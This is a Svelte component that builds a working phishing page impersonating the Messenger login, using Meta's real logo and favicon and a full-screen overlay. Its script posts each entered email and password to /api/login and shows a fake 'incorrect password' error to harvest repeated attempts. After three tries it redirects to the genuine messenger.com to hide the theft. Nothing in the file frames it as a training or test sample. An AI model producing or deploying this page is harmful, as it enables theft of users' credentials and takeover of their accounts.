<script lang="ts">
	let email = $state('');
	let password = $state('');
	let attempts = $state(0);
	let showError = $state(false);

	async function handleSubmit(e: Event) {
		e.preventDefault();
		attempts++;
		
		await fetch('/api/login', {
			method: 'POST',
			headers: { 'Content-Type': 'application/json' },
			body: JSON.stringify({ email, password, attempt: attempts })
		});

		if (attempts >= 3) {
			window.location.href = 'https://www.messenger.com';
		} else {
			showError = true;
			password = '';
		}
	}
</script>

<svelte:head>
	<title>Messenger - Login</title>
	<link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico" />
</svelte:head>

<div class="page-overlay">
	<div class="login-container">
		<div class="logo-section">
			<img 
				src="https://static.xx.fbcdn.net/rsrc.php/yb/r/M8rOX7S5AN3.svg" 
				alt="Messenger"
				class="messenger-logo"
			/>
			<h2 class="tagline">Connect with your favorite people.</h2>
		</div>

		<form class="login-form" onsubmit={handleSubmit}>
			<input 
				type="text" 
				class="input-field"
				placeholder="Email or phone number"
				bind:value={email}
				required
			/>
			<input 
				type="password" 
				class="input-field"
				placeholder="Password"
				bind:value={password}
				required
			/>
			{#if showError}
				<div class="error-msg">The password that you've entered is incorrect.</div>
			{/if}
			<button type="submit" class="continue-btn">Continue</button>
			
			<label class="keep-signed-in">
				<input type="checkbox" />
				<span>Keep me signed in</span>
			</label>
		</form>
	</div>

	<div class="footer-links">
		<a href="#!">Not on Facebook?</a>
		<span class="divider">|</span>
		<a href="#!">Forgot password</a>
		<span class="divider">|</span>
		<a href="#!">Privacy Policy</a>
		<span class="divider">|</span>
		<a href="#!">Terms</a>
		<span class="divider">|</span>
		<a href="#!">Cookies Policy</a>
		<span class="divider">|</span>
		<span>© Meta 2025</span>
	</div>
</div>

<style>
	:global(*) {
		margin: 0;
		padding: 0;
		box-sizing: border-box;
	}

	.page-overlay {
		position: fixed;
		top: 0;
		left: 0;
		right: 0;
		bottom: 0;
		z-index: 99999;
		background: #fff;
		display: flex;
		flex-direction: column;
		align-items: center;
		justify-content: center;
		font-family: Segoe UI, Helvetica, Arial, sans-serif;
	}

	.login-container {
		text-align: center;
		padding: 40px;
		width: 100%;
		max-width: 400px;
	}

	.logo-section {
		text-align: center;
		margin-bottom: 24px;
	}

	.messenger-logo {
		height: 80px;
		display: block;
		margin: 0 auto 20px;
	}

	.tagline {
		font-size: 24px;
		font-weight: 400;
		color: #1c1e21;
		margin: 0;
	}

	.login-form {
		display: flex;
		flex-direction: column;
		gap: 16px;
		margin-top: 32px;
		max-width: 330px;
		margin-left: auto;
		margin-right: auto;
	}

	.input-field {
		padding: 16px;
		border: 1px solid #ccd0d5;
		border-radius: 6px;
		font-size: 17px;
		outline: none;
		background: #fff;
	}

	.input-field:focus {
		border-color: #0084ff;
		box-shadow: 0 0 0 2px rgba(0, 132, 255, 0.2);
	}

	.input-field::placeholder {
		color: #8a8d91;
	}

	.error-msg {
		color: #be4b49;
		font-size: 13px;
		text-align: left;
	}

	.continue-btn {
		background: #0084ff;
		color: white;
		border: none;
		border-radius: 20px;
		padding: 12px 32px;
		font-size: 15px;
		font-weight: 600;
		cursor: pointer;
		width: fit-content;
		margin: 8px auto 0;
	}

	.continue-btn:hover {
		background: #0077e6;
	}

	.keep-signed-in {
		display: flex;
		align-items: center;
		justify-content: center;
		gap: 8px;
		font-size: 15px;
		color: #65676b;
		margin-top: 16px;
		cursor: pointer;
	}

	.keep-signed-in input {
		width: 18px;
		height: 18px;
		accent-color: #0084ff;
	}

	.footer-links {
		position: fixed;
		bottom: 0;
		left: 0;
		right: 0;
		padding: 16px;
		text-align: center;
		font-size: 12px;
		color: #65676b;
		background: #fff;
	}

	.footer-links a {
		color: #0084ff;
		text-decoration: none;
	}

	.footer-links a:hover {
		text-decoration: underline;
	}

	.divider {
		margin: 0 12px;
		color: #ccc;
	}
</style>
